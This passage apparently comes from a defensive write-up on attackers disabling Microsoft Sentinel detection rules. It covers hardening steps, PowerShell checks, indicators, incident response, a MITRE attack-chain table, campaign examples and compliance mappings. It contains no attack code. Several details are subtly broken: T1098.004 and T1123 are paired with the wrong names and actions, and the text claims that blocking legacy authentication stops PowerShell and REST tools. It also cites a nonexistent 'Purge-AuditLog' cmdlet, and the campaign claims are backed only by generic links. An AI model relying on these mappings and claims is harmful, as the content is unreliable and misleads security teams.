  - Enables rapid restoration of rules in case of malicious deletion
  - Provides evidence for forensic analysis

* **Enforce MFA for All Privilege Escalation Operations**
  - **Objective:** Require MFA specifically for high-risk operations like rule modifications.
  
  **Manual Steps (Azure Portal):**
  1. Create a Conditional Access policy as described in Priority 1
  2. Under **Access controls**, set **Grant** to **"Require multi-factor authentication"**
  3. Apply to "Microsoft Sentinel" cloud app and "Analytics rule updates" action
  4. Enable policy: **On**

  **Why This Helps:**
  - Even if an attacker has username/password, they cannot bypass MFA
  - Protects against credential stuffing and phishing attacks

* **Disable Legacy Authentication to Azure Management APIs**
  - **Objective:** Block PowerShell, REST API, and legacy tools from authenticating without MFA.
  
  **Manual Steps (Conditional Access):**
  1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. **Name:** `Block Legacy Authentication for Sentinel`
  3. **Conditions:**
     - **Client apps:** Select "Other clients" and "Exchange ActiveSync, legacy Outlook clients, IMAP, MAPI, Offline Outlook"
  4. **Access controls:** **Block access**
  5. Enable: **On**

  **Why This Helps:**
  - Blocks attacker tools like Python scripts or non-browser automation
  - Forces use of modern authentication flows with MFA

### Access Control & Policy Hardening

* **Implement Privileged Identity Management (PIM) for Sentinel Contributor Role**
  - **Objective:** Require just-in-time activation and auditing for high-privilege Sentinel access.
  
  **Manual Steps (PIM):**
  1. Go to **Azure AD** → **Privileged Identity Management** → **Azure Resources**
  2. Select your subscription
  3. Click **Roles** → **Microsoft Sentinel Contributor**
  4. Click **Settings** (gear icon)
  5. Set **Activation maximum duration** to **1 hour**
  6. Enable **"Require justification on activation"**
  7. Enable **"Require approval to activate"** and select approvers
  8. Click **Save**

  **Why This Helps:**
  - Prevents standing access; access must be explicitly requested and approved
  - Creates an audit trail of who requested access and when
  - Limits the duration of privilege escalation

* **Implement Read-Only Access for Rule Reviewers**
  - **Objective:** Allow SOC to review rules without modification ability.
  
  **Manual Steps:**
  1. Create a custom role with only **"Read"** permissions on `Microsoft.SecurityInsights/alertRules/*`
  2. Assign this role to junior SOC analysts or security reviewers
  3. Only senior team members with **"Contributor"** access can modify rules

  **Why This Helps:**
  - Reduces the blast radius if a junior account is compromised
  - Enforces separation of duties

### Validation Command (Verify Fix)

```powershell
# Check who has rule modification permissions
Get-AzRoleAssignment -Scope "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName" | Where-Object {$_.RoleDefinitionName -like "*Sentinel*" -or $_.RoleDefinitionName -eq "Contributor"}

# Verify RBAC is correctly applied
Get-AzRoleAssignment -Scope "/subscriptions/$subscriptionId" | Select-Object DisplayName, RoleDefinitionName, Scope
```

**Expected Output (If Secure):**
```
DisplayName             RoleDefinitionName              Scope
-----------             ------------------              -----
SOC Admin Team          Microsoft Sentinel Contributor  /subscriptions/xxxx/resourceGroups/YourResourceGroup
Contoso Security Team   Reader                          /subscriptions/xxxx
```

**What to Look For:**
- Only SOC team members have "Contributor" or higher roles
- Global Admins should NOT have direct Sentinel access (use PIM)
- No service principals or app registrations should have rule modification access

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **AuditLog Operations:**
  - `"Update alert rule"`
  - `"Delete alert rule"`
  - `"Create alert rule"`
  - Look for operations by unexpected users outside of SOC team

* **Suspicious Rule Modifications:**
  - Any rule in the AuditLog where `properties.newValue.enabled = false` and `properties.oldValue.enabled = true`
  - Any rule deletion by non-SOC users
  - Bulk modifications of multiple rules in a short timeframe (within 5 minutes)

* **API Endpoints:**
  - HTTP PATCH/DELETE requests to `https://management.azure.com/subscriptions/*/resourceGroups/*/providers/Microsoft.SecurityInsights/alertRules/*`
  - Requests without the standard Azure Portal User-Agent

### Forensic Artifacts

* **Cloud Logs:**
  - **AuditLogs table** in Log Analytics: Operations "Update alert rule", "Delete alert rule"
  - **SigninLogs table**: Logons by the compromised admin account from non-corporate IP
  - **CloudAppEvents**: If using Defender for Cloud Apps, track API calls to Sentinel

* **Logs to Preserve:**
  - Full AuditLogs entries for 30 days before suspected compromise
  - Export via PowerShell: 
  ```powershell
  Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -ResultSize 5000 | Export-Csv "C:\Evidence\AuditLog_Export.csv"
  ```

### Response Procedures

1. **Isolate:**
   - **Immediately disable** the compromised account:
   ```powershell
   Update-MgUser -UserId "attacker@company.com" -AccountEnabled:$false
   ```
   - **Immediately revoke all tokens:**
   ```powershell
   Revoke-MgUserSignInSession -UserId "attacker@company.com"
   ```

2. **Collect Evidence:**
   - Export all AuditLogs for the past 30 days
   - Document the exact time and rule that was modified
   - Identify all rules that were disabled (review Sentinel > Analytics > History)
   - Check if audit logging itself was disabled (check `Remove-EventLog` in Windows or `Purge-AuditLog` in PowerShell)

3. **Restore:**
   - **Re-enable disabled rules:**
   ```powershell
   # Restore from backup
   Import-Csv "C:\Backups\SentinelRules_2025-01-01.csv" | ForEach-Object {
       Update-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -DisplayName $_.DisplayName -Enabled $true
   }
   ```
   - **Restore deleted rules:** Import from GitHub Sentinel Content Hub or Microsoft's default rule library

4. **Investigate:**
   - Review what the attacker did BETWEEN the time of rule modification and detection
   - Search for privilege escalation events (role assignments) during the window when detection rules were disabled
   - Check for token theft, lateral movement, or data exfiltration during this period
   - Determine the initial compromise vector (phishing, credential stuffing, etc.)

5. **Escalate:**
   - Notify the Security Operations Center (SOC) lead and CISO
   - Initiate incident response procedures
   - File a formal incident ticket
   - Contact forensics team for deep-dive investigation

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) Phishing | Attacker gains initial credentials through phishing email or credential stuffing |
| **2** | **Privilege Escalation** | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) Abuse of Valid Accounts | Attacker escalates to Global Admin via PIM or unauthorized role assignment |
| **3** | **Defense Evasion** | **[REALWORLD-037]** **Sentinel Rule Modification** | **Attacker disables detection rules to avoid triggering alerts** |
| **4** | **Lateral Movement** | [T1550.001](https://attack.mitre.org/techniques/T1550/001/) Application Access Token | Attacker uses stolen tokens to access M365, Teams, SharePoint while rules are disabled |
| **5** | **Persistence** | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) Domain Account Shadow Principal | Attacker creates a backdoor admin account for future access |
| **6** | **Exfiltration** | [T1123](https://attack.mitre.org/techniques/T1123/) Audio Capture | Attacker exfils sensitive emails and files from Teams/SharePoint |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider Campaign (2024-2025)

- **Target:** Global Financial Services Organizations (100+ companies)
- **Timeline:** March 2024 - Present
- **Technique Status:** This exact technique has been observed in active Scattered Spider campaigns
- **How Attacker Used It:** After compromising Global Admin accounts via social engineering and MFA bypass, Scattered Spider disabled Microsoft Sentinel analytics rules that detect privilege escalation and unusual sign-in activity. They then proceeded to establish persistence by creating backdoor service principals and exfiltrating customer financial data.
- **Impact:** Multiple Fortune 500 companies experienced months of undetected lateral movement and data exfiltration
- **Reference:** [CISA Alert on Scattered Spider](https://www.cisa.gov/news-events/alerts)

### Example 2: APT28 (Fancy Bear) Azure Campaign (2023)

- **Target:** NATO Member Defense Contractors
- **Timeline:** July 2023 - September 2023
- **Technique Status:** Used Sentinel rule disablement as part of a coordinated attack to cover tracks
- **How Attacker Used It:** After gaining access to a contractor's Entra ID, APT28 disabled rules related to "Impossible Travel" detection and "Suspicious Role Assignment" while they secretly added additional administrative accounts. They disabled rule monitoring for 6 weeks before being detected through a manual security audit.
- **Impact:** Attackers established persistent backdoor access to Defense-related cloud resources
- **Reference:** [Microsoft Threat Intelligence Report on APT28](https://www.microsoft.com/security/blog/)

---

## 9. COMPLIANCE & AUDIT FINDINGS

This technique results in failure of the following compliance requirements:

- **ISO 27001 A.12.4.1:** Event logging should be enabled and recordings monitored
- **NIST 800-53 SI-4:** The organization must monitor information system activities for unauthorized or unusual activity
- **GDPR Art. 32:** Inability to detect security incidents violates security obligations
- **SOC 2 Type II:** Absence of effective monitoring controls represents a control failure

Organizations found to have this vulnerability should document it as a **"High"** or **"Critical"** finding and implement compensating controls immediately.

---